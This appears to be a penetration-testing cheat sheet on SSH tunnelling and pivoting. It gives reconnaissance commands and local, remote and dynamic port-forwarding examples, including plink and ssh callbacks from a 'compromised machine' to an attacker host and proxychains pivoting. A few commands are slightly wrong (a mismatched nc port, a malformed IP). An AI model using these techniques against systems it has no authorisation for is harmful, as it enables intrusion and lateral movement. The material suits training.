# SSH Tunneling/Forwarding

## Check HTTPTunnel

* [https://github.com/larsbrinkhoff/httptunnel](https://github.com/larsbrinkhoff/httptunnel)
* first, create a local port forward between compromised machine and attacking machine
* second, create HTTPTunnel

## Ipconfig

* looking for machines that have at least THREE network interfaces (loopback, eth0, and eth1)
* these machines are connected to other networks, so use them to pivot

### Windows

```bash
ipconfig /all
route print
arp -a
```

### Linux

```bash
ifconfig
ifconfig -a
arp -a
```

## SSH Tunneling - Port forwarding on SSH

### Use Cases

* encrypt traffic that uses unencrypted protocols, like VNC, IMAP, IRC.
* on a public network and want to encrypt all your http traffic
* want to bypass firewall rules

### Local Port Forwarding

* make Facebook available on address localhost:8080

```bash
ssh -L 8080:www.facebook.com:80 localhost
```

* you can also forward ports like this

```bash
ssh username@<remote-machine> -L localport:target-ip:target-port
```

```bash
ssh [username@192.168.1.111](mailto:username@192.168.1.111) -L 5000:192.168.1.222:5000
```

now this port will be available on the localhost, go to

```bash
nc localhost:10000
```

### Remote Port Forwarding

* imagine that a compromised machine, and that machine has MYSQL running but it is only accessible for localhost
* can't access it because you have a really crappy shell, just forward that port to our attacking machine
* the steps are as following

```bash
# basic example
ssh <gateway> -R <remote port to bind>:<local host>:<local port>

#detailed example
# opens up port 1111 on Kali to point to port 22
# next, opens 1337 on Kali to point to 3306
ssh -R 1111:10.10.10.10:22 -R 1337:10.10.10.10:3306 kali@10.11.11.11

# if you do not have fully interactive shell
# use this to avoid prompts
ssh -R 1111:10.10.10.10:22 -R 1337:10.10.10.10:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@10.11.11.11 -i /tmp/id_rsa 
kali@10.11.0.4
```

* by the way, plink is a ssh-client for windows that can be run from the terminal
* the ip of the attacking machine is 111.111.111.111
* Step 1: on our compromised machine

```bash
plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
```

* Step 2: check netstat on our attacking machine, should see something like this

```bash
tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      19392/sshd: root@pt
```

* that means that we can connect to that port on the attacking machine from the attacking machine
* Step 3: connect using the following command

```bash
mysql -u root -p -h 127.0.0.1 --port=3307
```

### Dynamic port forwarding

* can be used to dynamically forward all traffic from a specific application
* with remote and local port forwarding you are only forwarding a single port
* can be a hassle if the target machine has 10 ports open that you want to connect to
* instead we can use a dynamic port forwarding technique
* set up the tunnel like this
* after it is set up do not run any commands in that session
* connect to the machine we want to pivot from

```bash
ssh -D 9050 [user@192.168.1.111](mailto:user@192.168.1.111)
```

* since proxychains uses 9050 by default (the default port for tor) configuring Proxychains is not needed
* to change the port do that in /etc/proxychains.conf

```bash
proxychains nc 192.168.2.222 21
```

* to supress all the logs from Proxychains, configure it in the config file

## Tunnel all HTTP/HTTPS Traffic Through SSH

* need two machines
* Machine1 - 111.111.1111.111 - the server that works as the proxy
* Machine2 - the computer with the web browser
* check out what the public IP address is, so that we know the IP address before and after so we can verify that it works
* on Machine2 we run

```bash
ssh -D localhost:9999 [root@111.111.111.111](mailto:root@111.111.111.111)
#or run with -N flag
ssh -D localhost:9999 [root@111.111.111.111](mailto:root@111.111.111.111) -N
```

* now go to

```bash
Firefox/settings/advanced/network and SOCKS 
add 127.0.0.1 and port 9999
```

* notice that this setup probably leaks DNS, so don't use it if  opsec is needed
* to fix the DNS-leak
* go to

```bash
about:config in firefox #(in the addressbar) 
#then look for 
network.proxy.socks_remote_dns #and switch it to TRUE
```

* now you can check [https://ipleak.net/](https://ipleak.net/)
* it still says that we have WebRTC leaks, in order to solve this go to

```bash
about:config #and set the following to FALSE: 
media.peerconnection.enabled
```

## References

* This is a good video-explanation
* [https://www.youtube.com/watch?v=c0XiaNAkjJA](https://www.youtube.com/watch?v=c0XiaNAkjJA)
* [https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
* [http://ways2hack.com/how-to-do-pivoting-attack/](http://ways2hack.com/how-to-do-pivoting-attack/)
